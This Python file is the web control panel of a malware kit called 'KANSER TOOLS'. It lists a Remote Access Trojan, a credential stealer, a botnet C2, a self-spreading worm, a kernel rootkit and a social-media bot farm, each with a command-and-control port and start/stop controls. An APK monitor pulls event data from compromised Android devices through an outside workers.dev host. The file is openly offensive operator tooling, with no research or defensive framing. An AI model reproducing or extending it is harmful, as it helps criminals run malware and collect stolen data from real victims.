#!/usr/bin/env python3
"""KANSER TOOLS — Web Dashboard v4 (Zero dependencies — Python http.server)"""
import json, time, threading, os, sys, socket, platform
from http.server import HTTPServer, BaseHTTPRequestHandler

C = {"R":"\033[91m","G":"\033[92m","Y":"\033[93m","W":"\033[0m"}
_start = time.time()
_lock = threading.Lock()
_stats = {
    "system": {"hostname": socket.gethostname(), "os": f"{platform.system()} {platform.release()}", "python": sys.version.split()[0], "uptime": 0},
    "tools": {
        "rat":       {"name":"RAT Server",       "status":"stopped","clients":0,"port":4444,"events":[],"desc":"Remote Access Trojan"},
        "spyware":   {"name":"Spyware Panel",    "status":"stopped","agents":0, "port":5555,"events":[],"desc":"Credential stealer"},
        "botnet":    {"name":"KanserNet C2",     "status":"stopped","bots":0,   "port":6666,"events":[],"desc":"Botnet command center"},
        "worm":      {"name":"KanserWorm C2",    "status":"stopped","hosts":0, "port":7777,"events":[],"desc":"Self-spreading worm"},
        "rootkit":   {"name":"RootKit C2",       "status":"stopped","clients":0,"port":8888,"events":[],"desc":"Kernel-mode rootkit"},
        "sosyal":    {"name":"Social Farm",      "status":"stopped","tasks":0, "port":0,"events":[],"desc":"8-platform bot farm"},
    },
    "apk": {"active": False, "id": "", "events": [], "lastSeen": 0},
    "log": []
}

def update(tool, key, val):
    with _lock:
        if tool in _stats["tools"]: _stats["tools"][tool][key] = val

def event(tool, msg):
    with _lock:
        e = {"t": time.strftime("%H:%M:%S"), "tool": tool, "msg": str(msg)[:200]}
        _stats["log"].insert(0, e); _stats["log"] = _stats["log"][:80]
        if tool in _stats["tools"]:
            _stats["tools"][tool]["events"].insert(0, e)
            _stats["tools"][tool]["events"] = _stats["tools"][tool]["events"][:10]

def get_stats():
    with _lock:
        _stats["system"]["uptime"] = int(time.time() - _start)
        return json.loads(json.dumps(_stats))

HTML = r"""<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta http-equiv="refresh" content="6"><title>KANSER TOOLS</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#050505;color:#ccc;font-family:Consolas,monospace;padding:20px;max-width:1300px;margin:0 auto}
h1{color:#ff2a6d;font-size:22px;margin-bottom:2px}.sub{color:#555;font-size:11px;margin-bottom:18px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
.card{background:#0d0d0d;border:1px solid #1a1a1a;border-radius:10px;padding:16px}.card.on{border-color:#0f0;box-shadow:0 0 15px rgba(0,255,0,.04)}.card.off{border-color:#222}
.name{font-size:14px;font-weight:bold}.st{font-size:10px;margin-top:2px}.on{color:#0f0}.off{color:#f00}
.info{font-size:10px;color:#777;margin:6px 0;line-height:1.7}.port{color:#ff2a6d;font-weight:bold}
.evt{font-size:9px;color:#444;margin-top:8px;max-height:60px;overflow:hidden}.evt span{display:block;padding:1px 0}
.log{background:#0d0d0d;border:1px solid #1a1a1a;border-radius:10px;padding:16px;margin-top:14px;max-height:280px;overflow-y:auto}
.log h3{color:#ff2a6d;margin-bottom:8px;font-size:13px}.log .line{font-size:10px;color:#666;padding:3px 0;border-bottom:1px solid #111}
.btn{display:inline-block;margin:4px 4px 0 0;padding:4px 10px;font-size:10px;border-radius:4px;cursor:pointer;border:1px solid #333;background:#111;color:#ccc;text-decoration:none}
.btn:hover{background:#222}.btn.g{border-color:#0f0;color:#0f0}.btn.r{border-color:#f00;color:#f00}
</style></head><body>
<h1>KANSER TOOLS v5.0</h1><div class="sub" id="sys"></div>
<div style="margin:10px 0"><span class="port">APK Monitor:</span> <input id="apkid" placeholder="APK ID" style="background:#111;border:1px solid #333;color:#fff;padding:4px 8px;font-family:Consolas;width:200px;border-radius:4px"> <button onclick="loadApk()" class="btn g">LOAD</button> <span id="apkstatus" style="font-size:10px;color:#666;margin-left:10px"></span></div>
<div class="grid" id="grid"></div>
<div id="apkdiv" style="margin-top:10px"></div>
<div class="log"><h3>Event Log</h3><div id="log"></div></div>
<script>
async function load(){try{let r=await fetch("/api/stats");let d=await r.json();
document.getElementById("sys").textContent="OS: "+d.system.os+" | Python: "+d.system.python+" | Host: "+d.system.hostname+" | Uptime: "+Math.floor(d.system.uptime/60)+"m";
let g="";for(let[t,n]of Object.entries(d.tools)){
let s=n.status=="online"?"online":"stopped";let cls=n.status=="online"?"on":"off";
let i=[];if(n.port)i.push("Port: <span class=port>"+n.port+"</span>");if(n.clients!==undefined)i.push("Clients: "+n.clients);if(n.agents!==undefined)i.push("Agents: "+n.agents);if(n.bots!==undefined)i.push("Bots: "+n.bots);if(n.hosts!==undefined)i.push("Hosts: "+n.hosts);if(n.tasks!==undefined)i.push("Tasks: "+n.tasks);
g+='<div class="card '+cls+'"><div class=name>'+n.name+'</div><div class="st '+s.charAt(0)+'on">'+n.status.toUpperCase()+'</div><div class=info>'+i.join(" | ")+'</div><div class=info style=color:#555>'+n.desc+'</div><div class=evt>';
if(n.events){for(let e of n.events)g+='<span>'+e.t+' '+e.msg+'</span>'}g+='</div>';
g+='<a class="btn g" href="/api/start/'+t+'">START</a> <a class="btn r" href="/api/stop/'+t+'">STOP</a></div>'}
document.getElementById("grid").innerHTML=g||'<div class=card off><div class=st>No tools loaded.</div></div>';
let l="";for(let e of d.log.slice(0,50))l+='<div class=line>['+e.t+'] <b>'+e.tool.toUpperCase()+'</b> '+e.msg+'</div>';
document.getElementById("log").innerHTML=l||'No events yet.';
}catch(e){document.getElementById("grid").innerHTML='<div class="card off"><div class="st off">Loading...</div></div>';}}
load();setInterval(load,6000);
function loadApk(){
 var id=document.getElementById("apkid").value.trim();
 if(!id)return;
 fetch("/api/apk/"+id).then(r=>r.json()).then(d=>{
  var s=document.getElementById("apkstatus");
  if(d.error){s.textContent="Error: "+d.error;s.style.color="#f00";return}
  s.textContent="Events: "+d.events.length+" | Last: "+new Date(d.lastSeen).toLocaleTimeString();s.style.color="#0f0";
  var h='<div class="card on" style="margin-top:8px"><div class=name>APK: '+id+'</div><div class=evt>';
  for(var e of d.events.reverse())h+='<span>'+new Date(e.t).toLocaleTimeString()+' ['+e.type+'] '+e.data+'</span>';
  h+='</div></div>';
  document.getElementById("apkdiv").innerHTML=h;
 }).catch(e=>{document.getElementById("apkstatus").textContent="Failed";document.getElementById("apkstatus").style.color="#f00"})
}
</script></body></html>"""

class Handler(BaseHTTPRequestHandler):
    def _send(self, code, data, ct="text/html"):
        body = data if isinstance(data, bytes) else data.encode()
        self.send_response(code)
        self.send_header("Content-Type", ct)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        try:
            if self.path == "/": return self._send(200, HTML)
            if self.path == "/api/stats": return self._send(200, json.dumps(get_stats()), "application/json")
            if self.path.startswith("/api/apk/"):
                apk_id = self.path.split("/api/apk/")[-1]
                try:
                    import urllib.request
                    r = urllib.request.urlopen(f"https://discord-bot.kanserbusiness.workers.dev/apk-data/{apk_id}", timeout=5)
                    return self._send(200, r.read(), "application/json")
                except: return self._send(200, json.dumps({"error":"fetch failed"}), "application/json")
            if self.path.startswith("/api/start/"):
                t = self.path.split("/")[-1]; update(t, "status", "online"); event(t, "Started via dashboard")
                return self._send(200, json.dumps({"ok":True}), "application/json")
            if self.path.startswith("/api/stop/"):
                t = self.path.split("/")[-1]; update(t, "status", "stopped"); event(t, "Stopped via dashboard")
                return self._send(200, json.dumps({"ok":True}), "application/json")
        except: pass
        self._send(404, json.dumps({"error":"not found"}), "application/json")

    def do_POST(self):
        try:
            if self.path == "/api/event":
                length = int(self.headers.get("Content-Length", 0))
                d = json.loads(self.rfile.read(length)) if length > 0 else {}
                event(d.get("tool","?"), d.get("msg","?"))
                return self._send(200, json.dumps({"ok":True}), "application/json")
        except: pass
        self._send(500, json.dumps({"error":"invalid"}), "application/json")

    def log_message(self, *a): pass

def start_web(bind="0.0.0.0", port=9000):
    try:
        srv = HTTPServer((bind, port), Handler)
        print(f"\n  {C['G']}Web Dashboard: http://localhost:{port}  (Ctrl+C to stop){C['W']}")
        srv.serve_forever()
    except OSError as e:
        if "Address in use" in str(e):
            print(f"{C['Y']}[!] Port {port} busy. Is another dashboard running?{C['W']}")
        else:
            print(f"{C['R']}[!] {e}{C['W']}")
    except KeyboardInterrupt:
        print(f"\n{C['Y']}Dashboard stopped{C['W']}")
    except Exception as e:
        print(f"{C['R']}[!] {e}{C['W']}")

def start_thread(bind="0.0.0.0", port=9000):
    t = threading.Thread(target=start_web, args=(bind, port), daemon=True)
    t.start(); time.sleep(0.5); return t

if __name__ == "__main__":
    start_web()
